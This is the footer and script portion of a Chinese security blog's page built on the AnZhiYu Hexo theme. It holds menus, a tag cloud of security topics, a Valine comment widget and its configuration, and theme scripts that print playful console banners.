faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 0.88rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 0.88rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 0.88rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 0.88rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 0.88rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 0.88rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 0.88rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 0.88rem;">TryHackMe<sup>42</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 0.88rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 0.88rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 0.88rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 0.88rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="is-center" id="loading-database"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-pulse-icon"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/medium-zoom@1.1.0/dist/medium-zoom.min.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2020 By 安知鱼 V1.6.12",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 hybcx 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>(() => {
  const initValine = () => {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
      appKey: 'iEFJUGMm2FY91n9ZG1gdKBSy',
      avatar: 'mp',
      serverURLs: '',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  const loadValine = async () => {
    if (typeof Valine === 'function') initValine()
    else {
      await getScript('https://cdn.cbd.int/valine@1.5.1/dist/Valine.min.js')
      initValine()
    }
  }

  if ('Valine' === 'Valine' || !false) {
    if (false) anzhiyu.loadComment(document.getElementById('vcomment'),loadValine)
    else setTimeout(loadValine, 0)
  } else {
    window.loadOtherComment = loadValine
  }
})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script src="https://cdn.cbd.int/blueimp-md5@2.19.0/js/md5.min.js"></script><script>window.addEventListener('load', () => {
  const changeContent = (content) => {
    if (content === '') return content

    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
    content = content.replace(/<[^>]+>/g,"") // remove html tag

    if (content.length > 150) {
      content = content.substring(0,150) + '...'
    }
    return content
  }

  const getIcon = (icon, mail) => {
    if (icon) return icon
    let defaultIcon = '?d=mp'
    let iconUrl = `https://gravatar.loli.net/avatar/${md5(mail.toLowerCase()) + defaultIcon}`
    return iconUrl
  }

  const generateHtml = array => {
    let result = ''

    if (array.length) {
      for (let i = 0; i < array.length; i++) {
        result += '<div class=\'aside-list-item\'>'

        if (true) {
          const name = 'data-lazy-src'
          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'></a>`
        }

        result += `<div class='content'>
        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
        <div class='name'><span>${array[i].nick} / </span><time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
        </div></div>`
      }
    } else {
      result += '没有评论'
    }

    let $dom = document.querySelector('#card-newest-comments .aside-list')
    $dom && ($dom.innerHTML= result)
    window.lazyLoadInstance && window.lazyLoadInstance.update()
    window.pjax && window.pjax.refresh($dom)
  }

  const getComment = () => {
    const serverURL = 'https://7Sc5uZwc.api.lncldglobal.com'

    var settings = {
      "method": "GET",
      "headers": {
        "X-LC-Id": '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
        "X-LC-Key": 'iEFJUGMm2FY91n9ZG1gdKBSy',
        "Content-Type": "application/json"
      },
    }

    fetch(`${serverURL}/1.1/classes/Comment?limit=6&order=-createdAt`,settings)
      .then(response => response.json())
      .then(data => {
        const valineArray = data.results.map(function (e) {
          return {
            'avatar': getIcon(e.QQAvatar, e.mail),
            'content': changeContent(e.comment),
            'nick': e.nick,
            'url': e.url + '#' + e.objectId,
            'date': e.updatedAt,
          }
        })
        saveToLocal.set('valine-newest-comments', JSON.stringify(valineArray), 10/(60*24))
        generateHtml(valineArray)
      }).catch(e => {
        const $dom = document.querySelector('#card-newest-comments .aside-list')
        $dom.textContent= "无法获取评论，请确认相关配置是否正确"
      }) 
  }

  const newestCommentInit = () => {
    if (document.querySelector('#card-newest-comments .aside-list')) {
      const data = saveToLocal.get('valine-newest-comments')
      if (data) {
        generateHtml(JSON.parse(data))
      } else {
        getComment()
      }
    }
  }

  newestCommentInit()
  document.addEventListener('pjax:complete', newestCommentInit)
})</script><script async data-pjax src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.1/bubble/bubble.js"></script><script>var visitorMail = "";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><script src="/js/anzhiyu/right_click_menu.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>